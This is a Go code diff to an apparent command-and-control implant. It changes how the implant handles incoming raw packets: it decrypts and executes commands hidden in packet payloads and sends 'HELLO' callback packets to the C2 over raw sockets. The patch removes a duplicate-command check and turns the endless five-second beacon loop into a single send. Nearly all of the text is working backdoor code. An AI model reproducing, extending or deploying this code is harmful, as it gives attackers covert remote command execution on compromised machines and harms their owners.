@@ -520,39 +520,36 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		tmp := payload[4]
 		cmd := decryptCommand(tmp)
 		execCommand(cmd)
-		if debugCheck != "" { fmt.Println("lastPingRan: %s\n",lastPingRan) }
-		if debugCheck != "" { fmt.Println("cmd: %s\n",cmd) }
-		if lastPingRan != cmd {
-			//get ping command
-			if len(payload) > 5 {
-				if payload[5] == "1" {
-					if debugCheck != "" { fmt.Println("PING Request Received: %s\n",payload[5]) }
-					ping := payload[5]
-					if ping != "" {
-						iface, src := GetOutwardIface("8.8.8.8:80")
-						
 
-						srcMAC, err2 := net.ParseMAC(packet.LinkLayer().LinkFlow().Src().String())
-						if err2 != nil {
-							if debugCheck != "" { fmt.Println("[] MAC String Found:", packet.LinkLayer().LinkFlow().Src().String()) }
-							if debugCheck != "" { fmt.Println("[] ERROR PARSING MAC:", err2) }
-							return
-						} else {
-							if debugCheck != "" { fmt.Println("[+] MAC Found:", packet.LinkLayer().LinkFlow().Src().String()) }
-						}
-						srcIP := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
+		//get ping command
+		if len(payload) > 5 {
+			if payload[5] == "1" {
+				if debugCheck != "" { fmt.Println("PING Request Received: %s\n",payload[5]) }
+				ping := payload[5]
+				if ping != "" {
+					iface, src := GetOutwardIface("8.8.8.8:80")
+					
 
-						if srcIP == nil {
-							if debugCheck != "" { fmt.Println("[+] IP Found:", packet.NetworkLayer().NetworkFlow().Src().String()) }
-						}
-
-						sendHello(iface, src, srcIP, srcMAC)
-						if debugCheck != "" { fmt.Println("[+] PING SENT MAC(%s) IP(%s):", srcMAC, srcIP) }
+					srcMAC, err2 := net.ParseMAC(packet.LinkLayer().LinkFlow().Src().String())
+					if err2 != nil {
+						if debugCheck != "" { fmt.Println("[] MAC String Found:", packet.LinkLayer().LinkFlow().Src().String()) }
+						if debugCheck != "" { fmt.Println("[] ERROR PARSING MAC:", err2) }
+						return
+					} else {
+						if debugCheck != "" { fmt.Println("[+] MAC Found:", packet.LinkLayer().LinkFlow().Src().String()) }
 					}
+					srcIP := net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String())
+
+					if srcIP == nil {
+						if debugCheck != "" { fmt.Println("[+] IP Found:", packet.NetworkLayer().NetworkFlow().Src().String()) }
+					}
+
+					sendHello(iface, src, srcIP, srcMAC)
+					if debugCheck != "" { fmt.Println("[+] PING SENT MAC(%s) IP(%s):", srcMAC, srcIP) }
 				}
 			}
-			lastPingRan = cmd
 		}
+
 
 	}
 
@@ -577,32 +574,30 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	listen <- newHost
 }
 
-// Continuously send HELLO messages so that the C2 can respond with commands
+// Send a single hello packet
 func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr) {
-	for {
-		fd := NewSocket()
-		defer unix.Close(fd)
-		if debugCheck != "" { fmt.Println("[+] iface:", iface) }
-		if debugCheck != "" { fmt.Println("[+] src:", src) }
-		if debugCheck != "" { fmt.Println("[+] dst:", dst) }
-		if debugCheck != "" { fmt.Println("[+] dstMac:", dstMAC) }
-		
-		
-		packet := CreatePacket(iface, src, dst, 47135, 80, dstMAC, CreateHello(iface.HardwareAddr, src))
-		
-		//data := string(packet.ApplicationLayer().Payload())
+	fd := NewSocket()
+	defer unix.Close(fd)
+	if debugCheck != "" { fmt.Println("[+] iface:", iface) }
+	if debugCheck != "" { fmt.Println("[+] src:", src) }
+	if debugCheck != "" { fmt.Println("[+] dst:", dst) }
+	if debugCheck != "" { fmt.Println("[+] dstMac:", dstMAC) }
+	
+	
+	packet := CreatePacket(iface, src, dst, 47135, 80, dstMAC, CreateHello(iface.HardwareAddr, src))
+	
+	//data := string(packet.ApplicationLayer().Payload())
 //		tmpPacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
 //		if debugCheck != "" { fmt.Println("[+] packet:", tmpPacket.String()) }
 
-		addr := CreateAddrStruct(iface)
-		
-		if debugCheck != "" { fmt.Println("[+] addr:", addr) }
+	addr := CreateAddrStruct(iface)
+	
+	if debugCheck != "" { fmt.Println("[+] addr:", addr) }
 
-		SendPacket(fd, iface, addr, packet)
-		if debugCheck != "" { fmt.Println("[+] Sent HELLO to:", dst) }
-		// Send hello every 5 seconds
-		time.Sleep(5 * time.Second)
-	}
+	SendPacket(fd, iface, addr, packet)
+	if debugCheck != "" { fmt.Println("[+] Sent HELLO to:", dst) }
+	// Send hello every 5 seconds
+	time.Sleep(5 * time.Second)
 }
 
 // CreateHello creates a HELLO string for callbacks
